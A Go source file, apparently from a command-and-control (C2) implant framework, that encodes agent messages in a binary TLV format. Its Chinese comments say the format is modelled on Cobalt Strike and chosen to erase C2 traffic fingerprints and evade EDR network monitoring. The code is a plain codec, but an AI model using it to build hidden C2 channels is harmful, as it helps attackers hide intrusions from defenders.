// Package tlv 提供二进制 Type-Length-Value 协议编解码。
// 替代 JSON envelope：消除 C2 流量指纹，减少传输大小，
// 二进制格式在 EDR 网络监控中难以解析。
package tlv

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
)

// TLV 标签定义（大端编码）。
// 借鉴 Cobalt Strike 的 TLV 格式：4 字节类型 + 4 字节长度 + N 字节值。
const (
	TypeMagic       uint32 = 0xAE61AE61 // 4-byte magic
	TypeTimestamp   uint32 = 0x0001
	TypeAgentID     uint32 = 0x0002
	TypeMessageType uint32 = 0x0003
	TypePayload     uint32 = 0x0004
	TypeNonce       uint32 = 0x0005
	TypeSignature   uint32 = 0x0006
	TypeECDHPub     uint32 = 0x0007

	maxTLVValueLen = 10 * 1024 * 1024 // 10MB per individual TLV value
)

// Message 是 TLV 格式的消息。
type Message struct {
	Timestamp int64
	AgentID   string
	Type      string
	Payload   []byte
	Nonce     []byte
	Signature []byte
	ECDHPub   []byte
}

// Encode 将 Message 编码为二进制 TLV 格式。
// 帧格式: [Magic:4][TLV...]*
// 每个 TLV: [Type:4][Length:4][Value:N]
func Encode(msg *Message) ([]byte, error) {
	var buf bytes.Buffer

	// Magic header (4 bytes)
	binary.Write(&buf, binary.BigEndian, TypeMagic)

	// 写入固定字段
	writeTLV(&buf, TypeTimestamp, int64ToBytes(msg.Timestamp))
	writeTLV(&buf, TypeAgentID, []byte(msg.AgentID))
	writeTLV(&buf, TypeMessageType, []byte(msg.Type))
	writeTLV(&buf, TypePayload, msg.Payload)
	writeTLV(&buf, TypeNonce, msg.Nonce)
	writeTLV(&buf, TypeSignature, msg.Signature)
	writeTLV(&buf, TypeECDHPub, msg.ECDHPub)

	return buf.Bytes(), nil
}

// Decode 从二进制 TLV 格式解码为 Message。
func Decode(data []byte) (*Message, error) {
	r := bytes.NewReader(data)

	// 读取 magic (4 bytes)
	var magic uint32
	if err := binary.Read(r, binary.BigEndian, &magic); err != nil {
		return nil, fmt.Errorf("read magic: %w", err)
	}
	if magic != TypeMagic {
		return nil, fmt.Errorf("invalid magic: 0x%x (expected 0x%x)", magic, TypeMagic)
	}

	msg := &Message{}

	// 读取 TLV 条目
	for {
		var tlvType, tlvLen uint32
		if err := binary.Read(r, binary.BigEndian, &tlvType); err != nil {
			if err == io.EOF {
				break
			}
			return nil, fmt.Errorf("read type: %w", err)
		}
		if err := binary.Read(r, binary.BigEndian, &tlvLen); err != nil {
			return nil, fmt.Errorf("read length: %w", err)
		}

		value := make([]byte, tlvLen)
		if tlvLen > 0 {
			if tlvLen > maxTLVValueLen {
				return nil, fmt.Errorf("tlv value too large: %d bytes (max %d)", tlvLen, maxTLVValueLen)
			}
			if _, err := io.ReadFull(r, value); err != nil {
				return nil, fmt.Errorf("read value: %w", err)
			}
		}

		switch tlvType {
		case TypeTimestamp:
			msg.Timestamp = bytesToInt64(value)
		case TypeAgentID:
			msg.AgentID = string(value)
		case TypeMessageType:
			msg.Type = string(value)
		case TypePayload:
			msg.Payload = value
		case TypeNonce:
			msg.Nonce = value
		case TypeSignature:
			msg.Signature = value
		case TypeECDHPub:
			msg.ECDHPub = value
		}
	}

	return msg, nil
}

func writeTLV(buf *bytes.Buffer, t uint32, value []byte) {
	binary.Write(buf, binary.BigEndian, t)
	binary.Write(buf, binary.BigEndian, uint32(len(value)))
	buf.Write(value)
}

func int64ToBytes(v int64) []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint64(b, uint64(v))
	return b
}

func bytesToInt64(b []byte) int64 {
	if len(b) < 8 {
		return 0
	}
	return int64(binary.BigEndian.Uint64(b[:8]))
}

// FramedConn 提供 TLV 帧的读取和写入。
// 在 TCP/WebSocket 等流式传输上使用 TLV 帧定界。
type FramedConn struct {
	r io.Reader
	w io.Writer
}

// NewFramedConn 从 io.Reader/Writer 创建帧连接。
func NewFramedConn(r io.Reader, w io.Writer) *FramedConn {
	return &FramedConn{r: r, w: w}
}

// WriteMessage 编码并写入一个 TLV 消息。
func (fc *FramedConn) WriteMessage(msg *Message) error {
	data, err := Encode(msg)
	if err != nil {
		return err
	}
	// 写入帧长度（4 字节） + 数据
	length := uint32(len(data))
	if err := binary.Write(fc.w, binary.BigEndian, length); err != nil {
		return err
	}
	_, err = fc.w.Write(data)
	return err
}

// ReadMessage 读取并解码一个 TLV 消息。
func (fc *FramedConn) ReadMessage() (*Message, error) {
	var length uint32
	if err := binary.Read(fc.r, binary.BigEndian, &length); err != nil {
		return nil, err
	}
	if length > 10*1024*1024 { // 10MB 上限
		return nil, fmt.Errorf("tlv frame too large: %d bytes", length)
	}
	data := make([]byte, length)
	if _, err := io.ReadFull(fc.r, data); err != nil {
		return nil, err
	}
	return Decode(data)
}
